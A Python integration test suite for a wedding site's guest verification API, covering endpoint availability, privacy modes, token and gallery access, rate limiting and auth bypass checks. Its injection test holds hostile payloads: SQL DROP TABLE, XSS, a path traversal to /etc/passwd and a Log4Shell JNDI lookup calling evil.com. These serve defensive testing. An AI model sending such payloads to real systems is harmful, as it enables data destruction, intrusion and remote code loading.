"""
Comprehensive Integration Tests for Guest Verification System
Tests the complete guest verification flow including API endpoints,
service layer integration, and security controls.
"""

import pytest
import requests
import json
from datetime import datetime, timedelta
from typing import Dict, Any, Optional

# Test Configuration
BASE_URL = "http://localhost:8002"

class GuestVerificationTestSuite:
 """Comprehensive test suite for guest verification system"""
 
 def __init__(self):
 self.base_url = BASE_URL
 self.test_wedding_data = None
 self.test_guest_data = None
 self.admin_token = None
 self.test_results = {
 "api_endpoints": {},
 "integration_flows": {},
 "security_tests": {},
 "edge_cases": {},
 "errors": []
 }
 
 def run_all_tests(self):
 """Run comprehensive test suite"""
 print("=" * 80)
 print("GUEST VERIFICATION SYSTEM - COMPREHENSIVE TEST SUITE")
 print("=" * 80)
 
 try:
 # 1. Test basic connectivity
 self._test_connectivity()
 
 # 2. Test API endpoint availability
 self._test_api_endpoints()
 
 # 3. Setup test data
 self._setup_test_data()
 
 # 4. Test guest verification flows
 self._test_verification_flows()
 
 # 5. Test security controls
 self._test_security_controls()
 
 # 6. Test edge cases
 self._test_edge_cases()
 
 # 7. Test error handling
 self._test_error_handling()
 
 # 8. Generate detailed report
 self._generate_report()
 
 except Exception as e:
 self.test_results["errors"].append(f"Critical test suite error: {str(e)}")
 print(f"CRITICAL ERROR: {str(e)}")
 
 return self.test_results
 
 def _test_connectivity(self):
 """Test basic API connectivity"""
 print("\n Testing API Connectivity...")
 
 try:
 response = requests.get(f"{self.base_url}/health/status", timeout=10)
 if response.status_code == 200:
 print(" API server is responding")
 self.test_results["api_endpoints"]["connectivity"] = True
 else:
 print(f" API server responding with status {response.status_code}")
 self.test_results["api_endpoints"]["connectivity"] = False
 except requests.exceptions.ConnectionError:
 print(" Cannot connect to API server")
 self.test_results["api_endpoints"]["connectivity"] = False
 raise Exception("API server is not running or accessible")
 except Exception as e:
 print(f" Connectivity test failed: {str(e)}")
 self.test_results["api_endpoints"]["connectivity"] = False
 
 def _test_api_endpoints(self):
 """Test guest verification API endpoints availability"""
 print("\n Testing Guest Verification API Endpoints...")
 
 endpoints_to_test = [
 {
 "name": "Wedding Privacy Info",
 "method": "GET",
 "path": "/weddings/privacy-info/test-slug",
 "expected_statuses": [200, 404]
 },
 {
 "name": "Guest Access Verification",
 "method": "POST", 
 "path": "/weddings/verify-guest-access/test-slug",
 "expected_statuses": [200, 403, 404],
 "data": {"name": "test", "phone": "1234567890"}
 },
 {
 "name": "Token-based Wedding Access",
 "method": "GET",
 "path": "/weddings/guest-access/test-slug/test-token",
 "expected_statuses": [200, 403, 404]
 },
 {
 "name": "Wedding by Slug (Deprecated)",
 "method": "GET",
 "path": "/weddings/slug/test-slug",
 "expected_statuses": [200, 404]
 },
 {
 "name": "Verified Gallery Access",
 "method": "POST",
 "path": "/gallery/verified?wedding_slug=test-slug",
 "expected_statuses": [200, 403, 404],
 "data": {"name": "test"}
 }
 ]
 
 for endpoint in endpoints_to_test:
 try:
 print(f"Testing {endpoint['name']}...")
 
 if endpoint["method"] == "GET":
 response = requests.get(f"{self.base_url}{endpoint['path']}", timeout=5)
 elif endpoint["method"] == "POST":
 response = requests.post(
 f"{self.base_url}{endpoint['path']}", 
 json=endpoint.get("data", {}),
 timeout=5
 )
 
 if response.status_code in endpoint["expected_statuses"]:
 print(f" {endpoint['name']} - Status: {response.status_code}")
 self.test_results["api_endpoints"][endpoint["name"]] = {
 "available": True,
 "status": response.status_code,
 "response_size": len(response.content)
 }
 else:
 print(f" {endpoint['name']} - Unexpected status: {response.status_code}")
 self.test_results["api_endpoints"][endpoint["name"]] = {
 "available": False,
 "status": response.status_code,
 "error": "Unexpected status code"
 }
 
 # Check response format
 try:
 response_json = response.json()
 self.test_results["api_endpoints"][endpoint["name"]]["json_response"] = True
 except:
 self.test_results["api_endpoints"][endpoint["name"]]["json_response"] = False
 
 except requests.exceptions.Timeout:
 print(f" {endpoint['name']} - Timeout")
 self.test_results["api_endpoints"][endpoint["name"]] = {
 "available": False,
 "error": "Timeout"
 }
 except Exception as e:
 print(f" {endpoint['name']} - Error: {str(e)}")
 self.test_results["api_endpoints"][endpoint["name"]] = {
 "available": False,
 "error": str(e)
 }
 
 def _setup_test_data(self):
 """Setup test wedding and guest data"""
 print("\n Setting up Test Data...")
 
 # Create test wedding with different privacy modes
 self.test_wedding_data = {
 "public_wedding": {
 "slug": "test-public-wedding",
 "couple_names": "John & Jane (Public)",
 "privacy_settings": {
 "privacy_mode": "public"
 }
 },
 "private_wedding": {
 "slug": "test-private-wedding", 
 "couple_names": "Bob & Alice (Private)",
 "privacy_settings": {
 "privacy_mode": "private",
 "require_phone_verification": True,
 "require_name_verification": True
 }
 },
 "password_wedding": {
 "slug": "test-password-wedding",
 "couple_names": "Mike & Sarah (Password)",
 "privacy_settings": {
 "privacy_mode": "password",
 "password_protection": "wedding123"
 }
 }
 }
 
 self.test_guest_data = {
 "valid_guest": {
 "name": "Test Guest",
 "phone": "+1234567890",
 "email": "test@example.com"
 },
 "partial_guest": {
 "name": "Partial Guest",
 "phone": ""
 }
 }
 
 print(" Test data prepared")
 
 def _test_verification_flows(self):
 """Test complete guest verification flows"""
 print("\n Testing Guest Verification Flows...")
 
 # Test 1: Public wedding access
 self._test_public_wedding_access()
 
 # Test 2: Private wedding verification
 self._test_private_wedding_verification()
 
 # Test 3: Password-protected wedding access
 self._test_password_wedding_access()
 
 # Test 4: Token-based access
 self._test_token_based_access()
 
 # Test 5: Gallery access integration
 self._test_gallery_access_integration()
 
 def _test_public_wedding_access(self):
 """Test access to public weddings"""
 print(" Testing public wedding access...")
 
 test_slug = "test-public-wedding"
 
 # Test privacy info endpoint
 try:
 response = requests.get(f"{self.base_url}/weddings/privacy-info/{test_slug}")
 
 if response.status_code == 404:
 # Wedding doesn't exist, which is expected for test data
 print(" ℹ Test wedding not found (expected for test environment)")
 self.test_results["integration_flows"]["public_wedding"] = {
 "privacy_info": "wedding_not_found",
 "note": "Test wedding not created in database"
 }
 else:
 data = response.json()
 privacy_mode = data.get("privacy_mode", "unknown")
 print(f" Privacy mode detected: {privacy_mode}")
 
 self.test_results["integration_flows"]["public_wedding"] = {
 "privacy_info": "success",
 "privacy_mode": privacy_mode,
 "requires_verification": data.get("requires_guest_verification", False)
 }
 except Exception as e:
 print(f" Public wedding test failed: {str(e)}")
 self.test_results["integration_flows"]["public_wedding"] = {"error": str(e)}
 
 def _test_private_wedding_verification(self):
 """Test private wedding guest verification"""
 print(" Testing private wedding verification...")
 
 test_slug = "test-private-wedding"
 
 # Test with valid guest credentials
 verification_data = {
 "name": "Test Guest",
 "phone": "+1234567890"
 }
 
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/{test_slug}",
 json=verification_data
 )
 
 print(f" Verification response status: {response.status_code}")
 
 if response.status_code == 404:
 print(" ℹ Test wedding not found (expected for test environment)")
 self.test_results["integration_flows"]["private_wedding"] = {
 "verification": "wedding_not_found"
 }
 elif response.status_code == 403:
 print(" Correctly denied access for unverified guest")
 self.test_results["integration_flows"]["private_wedding"] = {
 "verification": "correctly_denied",
 "response": response.json() if response.content else None
 }
 else:
 data = response.json()
 print(f" Verification result: {data}")
 self.test_results["integration_flows"]["private_wedding"] = {
 "verification": "success",
 "response": data
 }
 
 except Exception as e:
 print(f" Private wedding verification failed: {str(e)}")
 self.test_results["integration_flows"]["private_wedding"] = {"error": str(e)}
 
 def _test_password_wedding_access(self):
 """Test password-protected wedding access"""
 print(" Testing password-protected wedding access...")
 
 test_slug = "test-password-wedding"
 
 # Test with correct password
 verification_data = {"password": "wedding123"}
 
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/{test_slug}",
 json=verification_data
 )
 
 print(f" Password verification status: {response.status_code}")
 
 if response.status_code == 404:
 print(" ℹ Test wedding not found (expected)")
 self.test_results["integration_flows"]["password_wedding"] = {
 "verification": "wedding_not_found"
 }
 else:
 data = response.json()
 self.test_results["integration_flows"]["password_wedding"] = {
 "verification": "tested",
 "status": response.status_code,
 "response": data
 }
 
 except Exception as e:
 print(f" Password wedding test failed: {str(e)}")
 self.test_results["integration_flows"]["password_wedding"] = {"error": str(e)}
 
 def _test_token_based_access(self):
 """Test token-based guest access"""
 print(" Testing token-based access...")
 
 test_slug = "test-wedding"
 test_token = "test-token-123"
 
 try:
 response = requests.get(
 f"{self.base_url}/weddings/guest-access/{test_slug}/{test_token}"
 )
 
 print(f" Token access status: {response.status_code}")
 
 if response.status_code == 403:
 print(" Correctly denied access for invalid token")
 self.test_results["integration_flows"]["token_access"] = {
 "verification": "correctly_denied"
 }
 elif response.status_code == 404:
 print(" ℹ Wedding not found (expected)")
 self.test_results["integration_flows"]["token_access"] = {
 "verification": "wedding_not_found"
 }
 else:
 data = response.json()
 self.test_results["integration_flows"]["token_access"] = {
 "verification": "tested",
 "status": response.status_code,
 "response": data
 }
 
 except Exception as e:
 print(f" Token access test failed: {str(e)}")
 self.test_results["integration_flows"]["token_access"] = {"error": str(e)}
 
 def _test_gallery_access_integration(self):
 """Test gallery access integration with guest verification"""
 print(" Testing gallery access integration...")
 
 test_slug = "test-wedding"
 
 # Test gallery access without verification
 try:
 response = requests.get(f"{self.base_url}/gallery?wedding_slug={test_slug}")
 
 print(f" Unverified gallery access status: {response.status_code}")
 
 if response.status_code == 403:
 print(" Gallery correctly protected from unverified access")
 self.test_results["integration_flows"]["gallery_integration"] = {
 "unverified_access": "correctly_denied"
 }
 else:
 self.test_results["integration_flows"]["gallery_integration"] = {
 "unverified_access": "allowed",
 "status": response.status_code,
 "warning": "Gallery may not be properly protected"
 }
 except Exception as e:
 print(f" Gallery integration test failed: {str(e)}")
 self.test_results["integration_flows"]["gallery_integration"] = {"error": str(e)}
 
 # Test verified gallery access
 try:
 verification_data = {
 "name": "Test Guest",
 "phone": "+1234567890"
 }
 
 response = requests.post(
 f"{self.base_url}/gallery/verified?wedding_slug={test_slug}",
 json=verification_data
 )
 
 print(f" Verified gallery access status: {response.status_code}")
 
 if response.status_code == 403:
 print(" Gallery verification working correctly")
 self.test_results["integration_flows"]["gallery_integration"]["verified_access"] = "verification_required"
 elif response.status_code == 404:
 print(" ℹ Wedding not found for gallery test")
 self.test_results["integration_flows"]["gallery_integration"]["verified_access"] = "wedding_not_found"
 else:
 self.test_results["integration_flows"]["gallery_integration"]["verified_access"] = "allowed"
 
 except Exception as e:
 print(f" Verified gallery test failed: {str(e)}")
 if "gallery_integration" not in self.test_results["integration_flows"]:
 self.test_results["integration_flows"]["gallery_integration"] = {}
 self.test_results["integration_flows"]["gallery_integration"]["verified_access_error"] = str(e)
 
 def _test_security_controls(self):
 """Test security controls and access restrictions"""
 print("\n Testing Security Controls...")
 
 # Test 1: SQL Injection attempts
 self._test_injection_attacks()
 
 # Test 2: Invalid input handling
 self._test_invalid_inputs()
 
 # Test 3: Rate limiting (if implemented)
 self._test_rate_limiting()
 
 # Test 4: Authentication bypass attempts
 self._test_auth_bypass()
 
 def _test_injection_attacks(self):
 """Test for SQL injection and other injection vulnerabilities"""
 print(" Testing injection attack protection...")
 
 malicious_inputs = [
 "'; DROP TABLE weddings; --",
 "<script>alert('xss')</script>",
 "' OR '1'='1",
 "../../etc/passwd",
 "${jndi:ldap://evil.com/a}",
 "{{7*7}}"
 ]
 
 injection_results = {}
 
 for payload in malicious_inputs:
 try:
 # Test in various input fields
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test-slug",
 json={"name": payload, "phone": payload}
 )
 
 # Check if server handled malicious input safely
 if response.status_code == 500:
 injection_results[payload] = "server_error_detected"
 print(f" Server error with payload: {payload[:20]}...")
 else:
 injection_results[payload] = "handled_safely"
 
 except Exception as e:
 injection_results[payload] = f"exception: {str(e)}"
 
 self.test_results["security_tests"]["injection_protection"] = injection_results
 
 safe_count = sum(1 for result in injection_results.values() if result == "handled_safely")
 total_count = len(injection_results)
 
 print(f" {safe_count}/{total_count} injection attempts handled safely")
 
 def _test_invalid_inputs(self):
 """Test handling of invalid inputs"""
 print(" Testing invalid input handling...")
 
 invalid_inputs = [
 {"name": "", "phone": ""}, # Empty inputs
 {"name": "A" * 1000, "phone": "B" * 1000}, # Extremely long inputs
 {"name": None, "phone": None}, # Null inputs
 {"invalid_field": "test"}, # Invalid field names
 {}, # Empty object
 {"name": 123, "phone": 456}, # Wrong data types
 ]
 
 invalid_input_results = {}
 
 for i, input_data in enumerate(invalid_inputs):
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test-slug",
 json=input_data
 )
 
 invalid_input_results[f"test_{i}"] = {
 "input": str(input_data)[:100],
 "status": response.status_code,
 "handled": response.status_code in [400, 422, 403] # Expected error codes
 }
 
 except Exception as e:
 invalid_input_results[f"test_{i}"] = {
 "input": str(input_data)[:100],
 "error": str(e)
 }
 
 self.test_results["security_tests"]["invalid_input_handling"] = invalid_input_results
 print(f" Tested {len(invalid_inputs)} invalid input scenarios")
 
 def _test_rate_limiting(self):
 """Test rate limiting protection"""
 print(" Testing rate limiting...")
 
 # Make rapid requests to test rate limiting
 rate_limit_results = {"requests_made": 0, "rate_limited": False}
 
 try:
 for i in range(20): # Make 20 rapid requests
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test-slug",
 json={"name": "test", "phone": "test"},
 timeout=2
 )
 
 rate_limit_results["requests_made"] += 1
 
 if response.status_code == 429: # Too Many Requests
 rate_limit_results["rate_limited"] = True
 rate_limit_results["rate_limit_at_request"] = i + 1
 break
 
 except Exception as e:
 rate_limit_results["error"] = str(e)
 
 self.test_results["security_tests"]["rate_limiting"] = rate_limit_results
 
 if rate_limit_results["rate_limited"]:
 print(" Rate limiting is active")
 else:
 print(" No rate limiting detected (may not be configured)")
 
 def _test_auth_bypass(self):
 """Test authentication bypass attempts"""
 print(" Testing authentication bypass attempts...")
 
 bypass_attempts = {
 "direct_wedding_access": f"{self.base_url}/weddings/slug/private-wedding",
 "direct_gallery_access": f"{self.base_url}/gallery?wedding_slug=private-wedding",
 "admin_endpoint_access": f"{self.base_url}/admin/weddings"
 }
 
 bypass_results = {}
 
 for attempt_name, url in bypass_attempts.items():
 try:
 response = requests.get(url)
 bypass_results[attempt_name] = {
 "status": response.status_code,
 "blocked": response.status_code in [401, 403, 404]
 }
 
 except Exception as e:
 bypass_results[attempt_name] = {"error": str(e)}
 
 self.test_results["security_tests"]["auth_bypass"] = bypass_results
 
 blocked_count = sum(1 for result in bypass_results.values() 
 if result.get("blocked", False))
 
 print(f" {blocked_count}/{len(bypass_attempts)} bypass attempts properly blocked")
 
 def _test_edge_cases(self):
 """Test edge cases and boundary conditions"""
 print("\n Testing Edge Cases...")
 
 edge_cases = {
 "empty_slug": "",
 "very_long_slug": "a" * 500,
 "special_chars_slug": "test@#$%^&*()",
 "unicode_slug": "тест-свадьба",
 "null_slug": None
 }
 
 edge_case_results = {}
 
 for case_name, slug in edge_cases.items():
 try:
 if slug is None:
 # Skip None case as it would cause URL issues
 edge_case_results[case_name] = "skipped_null_case"
 continue
 
 response = requests.get(f"{self.base_url}/weddings/privacy-info/{slug}")
 edge_case_results[case_name] = {
 "status": response.status_code,
 "handled_gracefully": response.status_code in [400, 404, 422]
 }
 
 except Exception as e:
 edge_case_results[case_name] = {"error": str(e)}
 
 self.test_results["edge_cases"]["slug_handling"] = edge_case_results
 print(" Edge case testing completed")
 
 def _test_error_handling(self):
 """Test error handling and response format"""
 print("\n Testing Error Handling...")
 
 # Test various error scenarios
 error_scenarios = [
 {
 "name": "nonexistent_wedding",
 "url": f"{self.base_url}/weddings/privacy-info/definitely-not-a-real-wedding-slug",
 "expected_status": 404
 },
 {
 "name": "malformed_request",
 "url": f"{self.base_url}/weddings/verify-guest-access/test",
 "method": "POST",
 "data": "invalid json",
 "expected_status": 422
 }
 ]
 
 error_handling_results = {}
 
 for scenario in error_scenarios:
 try:
 if scenario.get("method") == "POST":
 if isinstance(scenario.get("data"), str):
 # Send malformed data
 response = requests.post(
 scenario["url"],
 data=scenario["data"],
 headers={"Content-Type": "application/json"}
 )
 else:
 response = requests.post(scenario["url"], json=scenario.get("data", {}))
 else:
 response = requests.get(scenario["url"])
 
 error_handling_results[scenario["name"]] = {
 "status": response.status_code,
 "expected": scenario["expected_status"],
 "correct": response.status_code == scenario["expected_status"],
 "has_error_message": bool(response.content)
 }
 
 # Check error response format
 try:
 error_data = response.json()
 error_handling_results[scenario["name"]]["json_error"] = True
 error_handling_results[scenario["name"]]["error_detail"] = error_data.get("detail", "No detail")
 except:
 error_handling_results[scenario["name"]]["json_error"] = False
 
 except Exception as e:
 error_handling_results[scenario["name"]] = {"error": str(e)}
 
 self.test_results["security_tests"]["error_handling"] = error_handling_results
 print(" Error handling testing completed")
 
 def _generate_report(self):
 """Generate comprehensive test report"""
 print("\n" + "=" * 80)
 print("GUEST VERIFICATION SYSTEM - TEST REPORT")
 print("=" * 80)
 
 # Summary statistics
 total_tests = 0
 passed_tests = 0
 failed_tests = 0
 warnings = 0
 
 # API Endpoints Summary
 print("\n API ENDPOINTS SUMMARY:")
 print("-" * 40)
 
 for endpoint, result in self.test_results["api_endpoints"].items():
 if endpoint == "connectivity":
 continue
 
 total_tests += 1
 if isinstance(result, dict) and result.get("available", False):
 passed_tests += 1
 print(f" {endpoint}")
 else:
 failed_tests += 1
 print(f" {endpoint}")
 if isinstance(result, dict) and "error" in result:
 print(f" Error: {result['error']}")
 
 # Integration Flows Summary
 print("\n INTEGRATION FLOWS SUMMARY:")
 print("-" * 40)
 
 for flow, result in self.test_results["integration_flows"].items():
 total_tests += 1
 if isinstance(result, dict):
 if "error" in result:
 failed_tests += 1
 print(f" {flow}: {result['error']}")
 elif "wedding_not_found" in str(result):
 warnings += 1
 print(f" {flow}: Test data not available")
 else:
 passed_tests += 1
 print(f" {flow}")
 else:
 passed_tests += 1
 print(f" {flow}")
 
 # Security Tests Summary
 print("\n SECURITY TESTS SUMMARY:")
 print("-" * 40)
 
 for security_test, result in self.test_results["security_tests"].items():
 total_tests += 1
 if isinstance(result, dict) and not any("error" in str(v) for v in result.values()):
 passed_tests += 1
 print(f" {security_test}")
 else:
 failed_tests += 1
 print(f" {security_test}")
 
 # Overall Assessment
 print("\n OVERALL ASSESSMENT:")
 print("=" * 40)
 
 if self.test_results["api_endpoints"].get("connectivity", False):
 print(" API Server: ONLINE")
 else:
 print(" API Server: OFFLINE")
 
 success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
 
 print(f"\nTest Results:")
 print(f" Total Tests: {total_tests}")
 print(f" Passed: {passed_tests}")
 print(f" Failed: {failed_tests}")
 print(f" Warnings: {warnings}")
 print(f" Success Rate: {success_rate:.1f}%")
 
 # System Status Assessment
 print(f"\n GUEST VERIFICATION SYSTEM STATUS:")
 
 if success_rate >= 80:
 print(" SYSTEM OPERATIONAL - Most features working correctly")
 elif success_rate >= 60:
 print(" SYSTEM PARTIAL - Some issues detected")
 else:
 print(" SYSTEM CRITICAL - Major issues detected")
 
 # Key Findings
 print(f"\n KEY FINDINGS:")
 print("-" * 40)
 
 # Check if guest verification endpoints exist
 verification_endpoint = self.test_results["api_endpoints"].get("Guest Access Verification", {})
 if verification_endpoint.get("available"):
 print(" Guest verification endpoints are implemented and accessible")
 else:
 print(" Guest verification endpoints may not be properly implemented")
 
 # Check security features
 injection_tests = self.test_results["security_tests"].get("injection_protection", {})
 if injection_tests:
 safe_injections = sum(1 for result in injection_tests.values() 
 if result == "handled_safely")
 total_injections = len(injection_tests)
 print(f" Injection protection: {safe_injections}/{total_injections} handled safely")
 
 # Check gallery integration
 gallery_test = self.test_results["integration_flows"].get("gallery_integration", {})
 if gallery_test.get("unverified_access") == "correctly_denied":
 print(" Gallery is properly protected from unauthorized access")
 else:
 print(" Gallery security may need attention")
 
 # Recommendations
 print(f"\n RECOMMENDATIONS:")
 print("-" * 40)
 
 if failed_tests > 0:
 print("1. Address failed API endpoints")
 
 if warnings > 0:
 print("2. Create test wedding data for comprehensive testing")
 
 if not self.test_results["security_tests"].get("rate_limiting", {}).get("rate_limited", False):
 print("3. Consider implementing rate limiting for security")
 
 print("4. Monitor error logs for any security anomalies")
 print("5. Implement comprehensive logging for guest verification events")
 
 # Export detailed results
 self._export_detailed_results()
 
 def _export_detailed_results(self):
 """Export detailed test results to JSON file"""
 try:
 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 filename = f"guest_verification_test_results_{timestamp}.json"
 
 with open(filename, 'w') as f:
 json.dump(self.test_results, f, indent=2, default=str)
 
 print(f"\n Detailed results exported to: {filename}")
 
 except Exception as e:
 print(f" Could not export detailed results: {str(e)}")

def main():
 """Main test execution function"""
 print("Starting Guest Verification System Integration Tests...")
 
 # Create and run test suite
 test_suite = GuestVerificationTestSuite()
 results = test_suite.run_all_tests()
 
 # Return results for further processing if needed
 return results

if __name__ == "__main__":
 main()